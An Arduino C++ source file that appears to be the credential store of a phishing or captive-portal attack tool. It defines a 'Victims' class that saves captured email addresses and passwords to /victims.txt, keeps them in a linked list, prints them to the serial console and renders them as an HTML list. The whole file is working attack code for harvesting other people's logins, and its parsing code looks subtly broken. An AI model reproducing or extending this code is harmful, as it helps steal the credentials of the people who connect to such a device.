#include <Arduino.h>
#include "Arquivomaneger.h"
using namespace std;


struct Victim{
    string username;
    string password;
};


struct No{
    Victim victim;
    No* prox_no;
};


class Victims {
private:
    No* ptr_no_cabeca;
    Arquivomaneger* arquivo;

    const char SEPARATE_VICTIMS = '\n';
    const char SEPARATE_INFO_VICTIMS = '\t';


    void adicionarNovoNo(Victim victim){
        No* ptr_novo_no;
        ptr_novo_no = new No;
        ptr_novo_no->victim = victim;
        ptr_novo_no->prox_no = NULL;

        if(ptr_no_cabeca != NULL){
            ptr_novo_no->prox_no = ptr_no_cabeca;
        }

        ptr_no_cabeca = ptr_novo_no;
    }
public:

    Victims(){
        ptr_no_cabeca = NULL;

        arquivo = new Arquivomaneger("/victims.txt");
        string victimsFullText = arquivo->readFile().c_str();

        Serial.println(victimsFullText.c_str());
        
        int res = -1, oldRes = 0;
        while ((res = victimsFullText.find(SEPARATE_VICTIMS, res + 1)) != string::npos){
            Victim victim;
            string victimFullText = victimsFullText.substr(oldRes, res);
            int division = victimFullText.find(SEPARATE_INFO_VICTIMS);

            victim.username = victimFullText.substr(0, division);
            victim.password = victimFullText.substr(division, res);
            
            adicionarNovoNo(victim);

            oldRes = res;
        }
    }

    void addVictim(String user, String pass){
        Victim v;
        v.password = pass.c_str();
        v.username = user.c_str();
        
        adicionarNovoNo(v);

        String oldContent = arquivo->readFile();
        arquivo->writeFile(user + SEPARATE_INFO_VICTIMS + pass + SEPARATE_VICTIMS + oldContent);
    }

    void clearVictims(){
        arquivo->clearFile();
    }


    String returnFullTextFormatted(){
        No* ptr_no_atual;
        ptr_no_atual = ptr_no_cabeca;

        string text = "";

        while(ptr_no_atual != NULL){
            text += "<li>Email:  <b>" + ptr_no_atual->victim.username + "</b></br>Password:  <b style=color:#ea5455;>" + ptr_no_atual->victim.password + "</b></li>";            

            ptr_no_atual = ptr_no_atual->prox_no;
        }

        return String(text.c_str());
    }

    
};
